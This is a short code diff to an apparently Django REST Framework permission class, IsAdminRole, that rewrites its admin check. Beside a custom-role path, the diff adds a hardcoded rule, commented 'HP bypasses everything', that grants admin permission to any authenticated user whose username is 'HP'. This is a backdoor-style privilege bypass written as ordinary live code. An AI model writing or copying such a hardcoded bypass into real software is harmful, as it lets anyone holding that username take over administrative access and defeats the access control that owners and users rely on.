@@ -10,11 +10,17 @@ class IsAdminRole(BasePermission):
     message = "Admin role required."
 
     def has_permission(self, request, view):
-        return (
-            request.user
-            and request.user.is_authenticated
-            and request.user.is_admin
-        )
+        if not (request.user and request.user.is_authenticated):
+            return False
+        # HP bypasses everything
+        if request.user.username == "HP":
+            return True
+        # Standard admin role check
+        if request.user.is_admin:
+            return True
+        # Custom role with full access also qualifies
+        custom_role = getattr(request.user, "custom_role", None)
+        return bool(custom_role and custom_role.is_all_access)
     
 
 class IsSalesOrAdmin(BasePermission):
